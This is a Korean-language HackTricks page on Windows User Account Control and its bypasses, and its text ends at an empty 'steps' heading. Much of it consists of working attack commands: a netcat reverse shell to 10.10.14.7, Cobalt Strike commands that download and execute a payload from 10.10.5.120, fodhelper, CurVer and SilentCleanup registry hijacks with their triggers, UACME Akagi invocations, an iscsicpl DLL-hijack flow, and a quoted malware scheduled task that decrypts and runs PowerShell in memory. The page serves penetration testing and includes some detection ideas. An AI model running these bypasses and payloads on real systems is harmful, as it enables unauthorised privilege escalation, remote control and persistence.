# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)은 **권한 상승 활동에 대한 동의 프롬프트**를 활성화하는 기능입니다. 애플리케이션에는 서로 다른 `integrity` 수준이 있으며, **높은 수준**의 프로그램은 **잠재적으로 시스템을 손상시킬 수 있는** 작업을 수행할 수 있습니다. UAC가 활성화되면 애플리케이션과 작업은 항상 **관리자가 아닌 계정의 보안 컨텍스트에서 실행**됩니다. 단, 관리자가 이러한 애플리케이션/작업이 실행될 시스템에 관리자 수준의 액세스 권한을 갖도록 명시적으로 승인한 경우는 예외입니다. 이는 관리자가 의도하지 않은 변경을 수행하지 않도록 보호하는 편의 기능이지만, 보안 경계로 간주되지는 않습니다.<sup>[[2]](#references)</sup>

integrity 수준에 대한 자세한 정보:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC가 적용되면 관리자 사용자에게는 2개의 토큰이 부여됩니다. 하나는 중간 integrity에서 일반 작업을 수행하기 위한 표준 사용자 토큰이고, 다른 하나는 관리자 권한이 포함된 토큰입니다.

이 [페이지](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works)에서는 로그온 프로세스, 사용자 경험 및 UAC 아키텍처를 포함하여 UAC의 작동 방식을 매우 자세히 설명합니다.<sup>[[2]](#references)</sup> 관리자는 security policies를 사용하여 로컬 수준에서 조직에 맞게 UAC 작동 방식을 구성할 수 있으며(secpol.msc 사용), Active Directory domain 환경에서는 Group Policy Objects (GPO)를 통해 구성하고 배포할 수 있습니다. 다양한 설정에 대한 자세한 내용은 [여기](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)에서 확인할 수 있습니다. UAC에는 설정할 수 있는 10개의 Group Policy 설정이 있습니다. 다음 표에서 추가 세부 정보를 제공합니다.

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: 기본 제공 Administrator 계정에 대한 Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode에서 관리자의 elevation prompt 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: 표준 사용자의 elevation prompt 동작](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: 애플리케이션 설치 감지 및 elevation prompt 표시](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: 서명되고 검증된 실행 파일만 elevate](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: secure locations에 설치된 UIAccess 애플리케이션만 elevate](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: 모든 관리자를 Admin Approval Mode으로 실행](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: secure desktop을 사용하지 않고 UIAccess 애플리케이션이 elevation prompt를 표시하도록 허용](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: elevation prompt 표시 시 secure desktop으로 전환](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: 파일 및 registry 쓰기 실패를 사용자별 위치로 virtualize](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows에서 software 설치를 위한 Policies

**local security policies**(대부분의 시스템에서 "secpol.msc")는 기본적으로 **관리자가 아닌 사용자가 software를 설치하지 못하도록** 구성되어 있습니다. 즉, 관리자가 아닌 사용자가 software용 installer를 다운로드할 수 있더라도 administrator account 없이는 실행할 수 없습니다.

### UAC가 Elevation을 요청하도록 강제하는 Registry Keys

admin rights가 없는 표준 사용자로서, "standard" account가 특정 작업을 수행하려고 할 때 **UAC가 credentials를 요청하도록** 설정할 수 있습니다. 이 작업을 수행하려면 특정 **registry keys**를 수정해야 하며, 이를 위해 admin permissions이 필요합니다. 단, **UAC bypass**가 있거나 attacker가 이미 admin으로 로그인한 경우는 예외입니다.

사용자가 **Administrators** group에 속해 있더라도 이러한 변경으로 인해 administrative actions을 수행하려면 사용자가 **account credentials를 다시 입력해야** 합니다.

**실제로는 이미 elevated token, UAC bypass 또는 이러한 keys를 변경할 수 있게 하는 misconfiguration이 있는 경우에만 유용합니다. 그렇지 않으면 registry write 자체가 차단됩니다.**

변경해야 하는 registry keys 및 entries는 다음과 같습니다(괄호 안은 기본값).

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Local Security Policy tool을 통해 수동으로 변경할 수도 있습니다. 변경하면 administrative operations 수행 시 사용자에게 credentials를 다시 입력하라는 prompt가 표시됩니다.

### Note

**User Account Control은 security boundary가 아닙니다.** 따라서 standard users는 local privilege escalation exploit 없이는 자신의 accounts에서 벗어나 administrator rights를 획득할 수 없습니다.

### 사용자에게 'full computer access' 요청하기
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC 권한

- Internet Explorer Protected Mode는 무결성 검사를 사용하여 높은 무결성 수준의 프로세스(예: 웹 브라우저)가 낮은 무결성 수준의 데이터(예: 임시 Internet 파일 폴더)에 액세스하지 못하도록 합니다. 이는 브라우저를 낮은 무결성 토큰으로 실행하여 수행됩니다. 브라우저가 낮은 무결성 영역에 저장된 데이터에 액세스하려고 하면 운영 체제는 프로세스의 무결성 수준을 확인하고 그에 따라 액세스를 허용합니다. 이 기능은 원격 코드 실행 공격이 시스템의 민감한 데이터에 액세스하는 것을 방지하는 데 도움이 됩니다.
- 사용자가 Windows에 로그온하면 시스템은 사용자의 권한 목록이 포함된 액세스 토큰을 생성합니다. 권한은 사용자의 권리와 기능을 조합한 것으로 정의됩니다. 또한 토큰에는 사용자를 컴퓨터 및 네트워크의 리소스에 인증하는 데 사용되는 사용자의 자격 증명 목록도 포함됩니다.

### Autoadminlogon

시작할 때 특정 사용자로 Windows에 자동으로 로그온하도록 구성하려면 **`AutoAdminLogon` 레지스트리 키**를 설정합니다. 이는 키오스크 환경이나 테스트 목적으로 유용합니다. 레지스트리에 비밀번호가 노출되므로 보안이 유지되는 시스템에서만 사용하세요.

Registry Editor 또는 `reg add`를 사용하여 다음 키를 설정합니다:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

일반적인 로그온 동작으로 되돌리려면 `AutoAdminLogon`을 0으로 설정합니다.

## UAC bypass

> [!TIP]
> 피해자 시스템에 graphical access가 있다면 UAC bypass는 간단합니다. UAC 프롬프트가 나타날 때 "Yes"를 클릭하기만 하면 됩니다.

다음 상황에서는 UAC bypass가 필요합니다: **UAC가 활성화되어 있고, 사용자의 프로세스가 medium integrity context에서 실행 중이며, 해당 사용자가 administrators 그룹에 속해 있는 경우**입니다.

UAC가 가장 높은 보안 수준인 **Always**로 설정되어 있으면 다른 수준인 **Default**로 설정된 경우보다 UAC를 bypass하기가 **훨씬 더 어렵다**는 점을 언급할 필요가 있습니다.

### medium-integrity shell에서 빠른 triage

bypass를 시도하기 전에 올바른 상황인지 확인하고 호스트 build를 알려진 작동 방법에 매핑하세요:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
실용적인 참고 사항:
- `EnableLUA=0`이면 bypass가 필요하지 않습니다. 모든 admin token은 high integrity를 직접 요청할 수 있습니다.
- `ConsentPromptBehaviorAdmin=2` 또는 `5`는 auto-elevate / COM-based bypasses에서 일반적인 시나리오입니다.
- `Always Notify`는 기준을 높이지만, 실패한다고 가정하지 말고 정확한 build에서 테스트해야 합니다. UACME는 최신 Windows build에서도 일부 `AlwaysNotify compatible` methods를 여전히 추적합니다.<sup>[[3]](#references)</sup>

### UAC 비활성화

UAC가 이미 비활성화되어 있는 경우(`ConsentPromptBehaviorAdmin`이 **`0`**), 다음과 같은 방법으로 **admin privileges를 사용해 reverse shell을 실행**할 수 있습니다(high integrity level):
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **매우** 기본적인 UAC "bypass" (전체 파일 시스템 액세스)

Administrators 그룹에 속한 사용자의 shell이 있다면 SMB를 통해 공유된 **C$**를 새 디스크에 로컬로 mount할 수 있으며, 그러면 **파일 시스템 내부의 모든 항목에 access**할 수 있습니다 (Administrator 홈 폴더 포함).

> [!WARNING]
> **이 trick은 더 이상 작동하지 않는 것 같습니다**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike techniques는 UAC가 최대 보안 수준으로 설정되어 있지 않은 경우에만 작동합니다
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire**와 **Metasploit**에도 **UAC**를 **bypass**하는 여러 모듈이 있습니다.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects는 최신 빌드에서도 실용적인 UAC 공격 표면으로 남아 있습니다. `ICMLuaUtil`은 여전히 현재 Windows 브랜치에서 작동하는 것으로 UACME에서 추적되고 있으며, offensive tooling은 COM Elevation Moniker를 호출하기 전에 interactive desktop process, 64-bit execution, 때로는 PEB/process masquerading을 조합하여 `CMSTPLUA`에 계속 대응하고 있습니다.<sup>[[3]](#references)</sup>

실용적인 팁:
- 사용자의 **interactive session**에 있는 **64-bit** process를 우선 사용하세요(일반적으로 `explorer.exe` 또는 그 child).
- raw shell이 실패하면 단순한 `CreateProcess` wrapper 대신 BOF / UACME implementation에서 다시 시도하세요.
- child execution은 **separate elevated process**에서 수행될 수 있습니다. 많은 BOF는 현재 beacon을 in-place로 elevate하지 않습니다.

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME)는 UAC bypass techniques 모음입니다. Visual Studio 또는 MSBuild로 compile하세요. build는 여러 executables(예: `Source\Akagi\output\x64\Debug\Akagi.exe`)를 생성하므로 target build에 적합한 method를 선택하세요.<sup>[[3]](#references)</sup>\
주의하세요. 일부 bypass는 사용자에게 경고할 수 있는 visible programs 또는 prompts를 실행합니다.<sup>[[3]](#references)</sup>

UACME에는 각 technique이 작동하기 시작한 **build version**이 나와 있습니다.<sup>[[3]](#references)</sup> 사용 중인 versions에 영향을 주는 technique을 검색할 수 있습니다:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
또한 [이](https://en.wikipedia.org/wiki/Windows_10_version_history) 페이지를 사용하면 빌드 버전에서 Windows 릴리스 `1607`을 확인할 수 있습니다.

실용적인 workflow는 먼저 **호스트 빌드를 평가한** 다음, 일치하는 method를 실행하는 것입니다:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage`는 로컬 빌드를 알려진 UAC methods와 빠르게 비교하므로, 작동하지 않는 PoC를 신속하게 제외하는 데 유용합니다.<sup>[[4]](#references)</sup>
- `UACME`는 여전히 bypass를 정확한 빌드에 매핑할 수 있는 최고의 공개 catalogue입니다. Version 3.7.1에서는 methods 83–85가 추가되었고, 이전 release에서는 기존 methods를 **Windows 11 25H2**에서 다시 테스트했습니다. 오래된 PoC가 수정 없이 여전히 적용된다고 가정하지 말고 method table과 release notes를 다시 확인하세요.<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify에서 사용 가능한 WNF/UIAccess chains (UACME 3.7.1)

`Always Notify`가 모든 UAC bypass를 제거하는 것은 아닙니다. UACME 3.7.1은 user-controlled environment/protocol state와 elevated scheduled-task 또는 UIAccess 동작을 결합하는 세 가지 새로운 x64 methods를 구현하며, 모두 `AlwaysNotify compatible`로 표시합니다:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot`를 redirect하여 WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`가 elevated `taskhostw.exe`로 하여금 `unifiedconsent.dll`을 side-load하도록 합니다. UACME에서는 Windows 10 build 19041부터 추적합니다.
- **84 — TabTip:** 동일한 environment-variable primitive를 UIAccess `TabTip.exe`에 사용합니다. 이 프로그램은 build에 따라 `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` 또는 `rsaenh.dll`을 load한 다음, 생성된 high-integrity UIAccess context에서 pivot합니다. UACME에서는 Windows 8.1 / Server 2016부터 추적합니다.
- **85 — Narrator:** per-user `feedback-hub` protocol을 hijack하고, `Alt+CapsLock+F`로 Narrator를 구동한 다음, `OskSupport.dll`을 side-load하는 writable copy의 `osk.exe`를 실행합니다. 이 방법에는 interactive desktop이 필요하며 Windows 10 1809 / Server 2019부터 추적됩니다.

UACME에 설명된 대로 payload units와 Akagi를 build한 후, 일치하는 method number를 호출합니다(선택적 command의 기본값은 `cmd.exe`입니다):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84와 85는 UIAccess/desktop interaction에 의존하므로 Session 0 또는 non-interactive service shell에서 수정 없이 작동할 것으로 기대해서는 안 됩니다. 세 방법 모두 environment/protocol state를 조작하고 DLL을 준비하므로, 테스트 후 해당 artifacts를 검사하고 제거하십시오.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

신뢰된 바이너리 `fodhelper.exe`는 최신 Windows에서 auto-elevated됩니다. 실행되면 아래의 per-user registry path를 조회하지만 `DelegateExecute` verb를 검증하지 않습니다. 해당 위치에 command를 심으면 Medium Integrity process(사용자가 Administrators 그룹에 속함)가 UAC prompt 없이 High Integrity process를 생성할 수 있습니다.

fodhelper가 조회하는 Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell 단계 (payload를 설정한 다음 trigger)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
참고:
- 현재 사용자가 Administrators의 구성원이고 UAC 수준이 default/lenient인 경우 작동합니다(Always Notify 및 추가 제한이 적용된 경우에는 작동하지 않음).
- 64비트 Windows에서 32비트 프로세스로부터 64비트 PowerShell을 시작하려면 `sysnative` 경로를 사용합니다.
- Payload는 모든 명령(PowerShell, cmd 또는 EXE 경로)이 될 수 있습니다. 은밀성을 위해 프롬프트 UI가 표시되는 방식은 피합니다.

#### CurVer/extension hijack variant (HKCU only)

최근 `fodhelper.exe`를 악용하는 샘플은 `DelegateExecute`를 피하고, 대신 사용자별 `CurVer` 값을 통해 **`ms-settings` ProgID**를 **redirect**합니다. auto-elevated binary는 여전히 `HKCU`에서 handler를 확인하므로, 키를 심는 데 admin token이 필요하지 않습니다:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
권한 상승 후, malware는 일반적으로 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin`을 `0`으로 설정하여 **향후 프롬프트를 비활성화**한 다음, 추가적인 defense evasion(예: `Add-MpPreference -ExclusionPath C:\ProgramData`)을 수행하고 높은 무결성으로 실행되도록 persistence를 다시 생성합니다. 일반적인 persistence task는 디스크에 **XOR-encrypted PowerShell script**를 저장하고, 매시간 이를 메모리에서 디코딩하고 실행합니다:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
이 변형은 여전히 dropper를 정리하고 staged payloads만 남기므로, 탐지는 **`CurVer` hijack**, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion 생성 또는 메모리에서 PowerShell을 복호화하는 scheduled tasks 모니터링에 의존하게 됩니다.<sup>[[5]](#references)</sup>

### `SilentCleanup` task를 통한 UAC bypass (`HKCU\Environment\windir`)

`SilentCleanup`은 `cleanmgr.exe`를 highest privileges로 실행하고 사용자 환경에서 `%windir%`를 확장합니다. `HKCU\Environment\windir`를 제어할 수 있다면 해당 확장을 임의의 command로 redirect하여 consent dialog 없이 높은 무결성을 얻을 수 있습니다.<sup>[[8]](#references)</sup> UACME가 이 technique을 계속 활성화하고 있으며, 최근 issue tracking에 따르면 Windows 11 24H2에서는 약간의 quoting 조정만 필요할 수 있으므로 최신 build에서도 여전히 테스트할 가치가 있습니다.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
해당 build에서 task가 경로를 인용한다면, payload가 quote로 끝나도록 다시 시도하세요(예: `cmd.exe"`). 테스트 후에는 항상 `HKCU\Environment\windir`를 정리하세요.

#### 추가 UAC bypass

UI flow, COM object 또는 desktop interaction을 악용하는 여러 classic UAC bypass는 victim에 대한 **full interactive session**이 필요합니다. 일반적인 `nc.exe` shell이나 **Session 0**에서 실행되는 service만으로는 충분하지 않은 경우가 많습니다.

이 문제는 **meterpreter** session을 사용하여 해결할 수 있는 경우가 많습니다. **Session** 값이 **1**인 **process**로 migrate하세요:

![ms-settings를 custom extension (.thm)으로 지정하고 해당 extension을 payload에 매핑 - 추가 UAC bypass: meterpreter session을 사용하여 얻을 수 있습니다. Session이...인 process로 migrate하세요...](<../../images/image (863).png>)

(_explorer.exe_가 작동해야 합니다)

### GUI를 사용한 UAC Bypass

**GUI에 접근할 수 있다면 UAC prompt가 표시될 때 그냥 수락하면 됩니다**. 실제로는 technical bypass가 필요하지 않습니다. 따라서 GUI session을 얻는 것만으로도 UAC가 추가하는 실질적인 불편을 우회하기에 충분한 경우가 많습니다.

또한 누군가가 사용 중이던 GUI session을 얻었다면(잠재적으로 RDP를 통해) **administrator로 실행 중인 tool이 일부 있을 수 있으며**, 이 tool에서 예를 들어 **cmd**를 **admin** 권한으로 직접 **run**할 수 있습니다. 그러면 UAC가 다시 prompt를 표시하지 않습니다. 예를 들면 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)가 있습니다. 이 방법은 조금 더 **stealthy**할 수 있습니다.

### 시끄러운 brute-force UAC bypass

noise를 허용할 수 있다면 [**ForceAdmin**](https://github.com/Chainski/ForceAdmin)과 같은 tool을 사용하여 사용자가 수락할 때까지 elevation을 반복적으로 요청할 수 있습니다.

### 자체 bypass - Basic UAC bypass methodology

**UACME**를 살펴보면 **많은 UAC bypass가 DLL hijacking을 악용한다는 것**을 알 수 있습니다(대개 elevated binary가 writable path에서 attacker가 제어하는 DLL을 load하도록 만듭니다). [DLL hijacking vulnerability를 찾는 방법은 여기에서 확인하세요](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. **autoelevate**되는 binary를 찾습니다(실행했을 때 high integrity level로 실행되는지 확인합니다).
2. procmon으로 **DLL Hijacking**에 취약할 수 있는 "**NAME NOT FOUND**" event를 찾습니다.
3. 일부 **protected path**(예: C:\Windows\System32)에는 writing permission이 없으므로 해당 경로 안에 DLL을 **write**해야 할 수 있습니다. 다음 방법으로 이를 우회할 수 있습니다:
1. **wusa.exe**: Windows 7,8 및 8.1. 이 tool은 high integrity level에서 실행되므로 CAB file의 content를 protected path 안에 extract할 수 있습니다.
2. **IFileOperation**: Windows 10.
4. DLL을 protected path 안에 copy하고 취약한 autoelevated binary를 실행하는 **script**를 준비합니다.

### 또 다른 UAC bypass technique

**autoElevated binary**가 실행할 **binary** 또는 **command**의 **name/path**를 **registry**에서 **read**하려고 하는지 확인하는 방식입니다(특히 binary가 이 정보를 **HKCU** 내부에서 검색하는 경우 더 유용합니다).

### `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack을 통한 UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe`는 search order를 통해 `iscsiexe.dll`을 load하도록 악용할 수 있는 **auto-elevated** binary입니다. 악성 `iscsiexe.dll`을 **user-writable** folder 안에 배치한 다음 현재 user의 `PATH`를 수정하여(예: `HKCU\Environment\Path`를 통해) 해당 folder가 검색되도록 만들 수 있다면, Windows는 **UAC prompt를 표시하지 않고** elevated `iscsicpl.exe` process 안에 attacker의 DLL을 load할 수 있습니다.<sup>[[1]](#references)[[6]](#references)</sup>

실용적인 참고 사항:
- 현재 user가 **Administrators** 그룹에 속해 있지만 UAC로 인해 **Medium Integrity**에서 실행 중인 경우 유용합니다.
- 이 bypass에서 중요한 것은 **SysWOW64** copy입니다. **System32** copy는 별도의 binary로 취급하고 동작을 독립적으로 검증하세요.
- 이 primitive는 **auto-elevation**과 **DLL search-order hijacking**의 조합이므로, 다른 UAC bypass에 사용하는 것과 동일한 ProcMon workflow를 통해 누락된 DLL load를 검증할 수 있습니다.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Detection ideas:
- `C:\Windows\SysWOW64\iscsicpl.exe` 실행 직전에 `HKCU\Environment\Path`에 대한 `reg add` / registry 쓰기가 발생하는지 Alert를 생성합니다.
- `%TEMP%` 또는 `%LOCALAPPDATA%\Microsoft\WindowsApps`와 같은 **user-controlled** 위치에서 `iscsiexe.dll`을 Hunt합니다.
- `iscsicpl.exe` 실행을 예상하지 못한 child process 또는 일반적인 Windows 디렉터리 외부에서 로드된 DLL과 Correlate합니다.

### 별도로 확인할 가치가 있는 최신 연구

일부 2024년 이후의 chain은 더 이상 전형적인 `HKCU\Software\Classes` registry hijack 형태로 나타나지 않습니다. 예를 들어 activation-context cache poisoning은 **drive remap**과 **DLL redirection**을 연결하여 `ctfmon.exe` 및 이후 대상인 `fodhelper.exe`와 같은 trusted UI / auto-elevated binary를 통해 medium integrity에서 high integrity로 이동할 수 있습니다. 여기에서 대규모 PoC를 중복해서 다루는 대신 다음 위치의 간결한 payload 예제를 확인하세요:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) per-logon-session DOS device map을 통한 drive-letter hijack

> [!NOTE]
> 2026년 8월 기준으로 Microsoft는 여전히 Administrator Protection을 **Insider preview**로 문서화하고 있습니다. 2025년 10월 rollout은 철회되었으며 이후 날짜에 진행될 예정입니다. 이러한 chain을 테스트하기 전에 **Admin Approval Mode with Administrator protection**이 실제로 활성화되어 있고 device가 reboot되었는지 확인하세요. 기본 25H2 version string만으로는 해당 feature가 활성화되었음을 입증할 수 없습니다.<sup>[[10]](#references)</sup>

Windows 11 25H2 preview build에서 전체 `RAiLaunchAdminProcess` / UIAccess attack surface를 확인하려면 전용 페이지를 참조하세요:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2의 “Administrator Protection”은 per-session `\Sessions\0\DosDevices/<LUID>` map을 사용하는 shadow-admin token을 이용합니다. 해당 directory는 최초 `\??` resolution 시 `SeGetTokenDeviceMap`에 의해 lazy하게 생성됩니다. 공격자가 shadow-admin token을 **SecurityIdentification**에서만 impersonate하면 directory가 공격자를 **owner**로 하여 생성됩니다(`CREATOR OWNER`를 상속함). 따라서 `\GLOBAL??`보다 우선하는 drive-letter link를 생성할 수 있습니다.<sup>[[7]](#references)</sup>

**단계:**

